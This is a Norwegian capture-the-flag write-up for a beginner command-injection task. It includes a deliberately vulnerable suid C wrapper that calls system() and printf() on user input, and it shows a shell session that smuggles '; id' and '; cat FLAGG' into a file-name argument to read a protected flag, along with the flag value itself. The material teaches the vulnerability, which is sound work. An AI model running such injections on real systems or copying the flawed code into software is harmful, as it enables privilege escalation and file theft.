# Command injection

Sårbarheter der *brukerdata* tolkes som kommandoer er en klassiker som aldri går av moten. En av de enkleste variantene oppstår når brukerdata sendes rett til et *shell*. Teknikken kalles *command injection*, og man kan få programmet til å kjøre flere kommandoer enn tiltenkt ved å skille dem med en semikolon.

*Cross-site scripting* (*XSS*), *path traversal*, *SQL injection*, *deserialization attacks* og *format string vulnerabilities* er andre variasjoner som kan føre til hele spekteret fra *informasjonslekkasjer* til *kodeeksekvering*.

Programfilene i denne katalogen sender brukerkontrollert data videre til operativsystemets `system()`-funksjon uten *sanitisering*. Det er bra for en hacker :)

Det er også en artig *format string-sårbarhet* her. Det er mulig å lese minne fra *stacken* ved å sende inn "%p.%p.%p....%p" (men dette trengs ikke for å lese ut flagget).

Prøv selv:

```sh
$ cat md5sum.c
$ ./md5sum FLAGG
$ ./md5sum "FLAGG LESMEG.md"
$ ./md5sum "FLAGG; id"
$ ???
$ scoreboard <FLAGG>
```
# Solution
```sh
login@corax:~/1_grunnleggende/3_injection$ cat md5sum.c 
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int
main(int argc, char *argv[])
{
        if (argc != 2) {
                printf("Usage: %s <file>\n\n", argv[0]);
                printf("Suid-wrapper rundt md5sum.\n");
                exit(0);
        }

        char cmd[512];
        snprintf(cmd, sizeof(cmd), "/usr/bin/md5sum %s", argv[1]);

        printf("Kjører kommando:\n");
        printf(cmd);
        printf("\n\n");

        setreuid(geteuid(), geteuid());
        printf("Resultat:\n");
        system(cmd);
}

login@corax:~/1_grunnleggende/3_injection$ ./md5sum FLAGG
Kjører kommando:
/usr/bin/md5sum FLAGG

Resultat:
033d05d362d1bb186150bac3c8b8b936  FLAGG

login@corax:~/1_grunnleggende/3_injection$ ./md5sum "FLAGG LESMEG.md"
Kjører kommando:
/usr/bin/md5sum FLAGG LESMEG.md

Resultat:
033d05d362d1bb186150bac3c8b8b936  FLAGG
2705304f88563d40113d164654436e2c  LESMEG.md

login@corax:~/1_grunnleggende/3_injection$ ./md5sum "FLAGG; id"
Kjører kommando:
/usr/bin/md5sum FLAGG; id

Resultat:
033d05d362d1bb186150bac3c8b8b936  FLAGG
uid=1003(basic3) gid=1000(login) groups=1000(login)

login@corax:~/1_grunnleggende/3_injection$ scoreboard 033d05d362d1bb186150bac3c8b8b936
md5sum er et program som regner ut md5-hashen av en fil.
Flagget er innholdet i filen.
Du vil ikke klare å finne flagget ved hjelp av brute force.

Hint: Hva er tittelen på denne oppgaven?

login@corax:~/1_grunnleggende/3_injection$ ./md5sum "FLAGG; cat FLAGG"
Kjører kommando:
/usr/bin/md5sum FLAGG; cat FLAGG

Resultat:
033d05d362d1bb186150bac3c8b8b936  FLAGG

Ved bruk av suid må man være spesielt forsiktig så en angriper ikke kan utnytte
de ekstra tilgangene til noe ondsinnet.

Her klarte du å lese en fil du ikke egentlig skulle se!

╭────────────────────────────────────────╮
│    cc04b2deb84a5260e06d8aca1002171b    │
╰────────────────────────────────────────╯

login@corax:~/1_grunnleggende/3_injection$ scoreboard cc04b2deb84a5260e06d8aca1002171b
Kategori: 1. Grunnleggende
Oppgave:  1.3_injection
Svar:     cc04b2deb84a5260e06d8aca1002171b
Poeng:    10

Gratulerer, korrekt svar!
```

